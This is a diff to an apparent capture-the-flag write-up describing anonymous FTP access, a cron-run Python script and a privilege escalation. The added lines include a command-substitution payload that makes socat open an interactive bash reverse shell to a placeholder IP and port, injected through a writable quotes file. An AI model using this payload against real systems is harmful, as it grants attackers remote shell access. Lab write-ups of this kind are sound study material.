@@ -58,6 +58,8 @@ All the links in the webpage redirects to the same home page.
 It is clearly visible from the port scan that ftp is allowing anonymous login.
 After login we see the file `dad_tasks`
 
+dad_tasks
+
 ```
 UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds
 ```
@@ -110,7 +112,7 @@ User weston may run the following commands on national-treasure:
 
 Checking the program `/usr/bin/bees` is of no use.
 
-But there was a script that is running everey 3 minutes.
+But there was a script that is running every 3 minutes.
 Then I checked `/etc/crontab` but no use.
 
 Using [pspy](https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s) we can see the script running..
@@ -139,6 +141,11 @@ os.system("wall " + quote)
 Now at this point we have write access to `.quotes`
 
 I deleted all the lines in `.quotes` and added a reverse shell using socat
+I have used `wget` to get the script from local machine.
+
+```
+$(/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ip>:<port>)
+```
 
 <br>
 
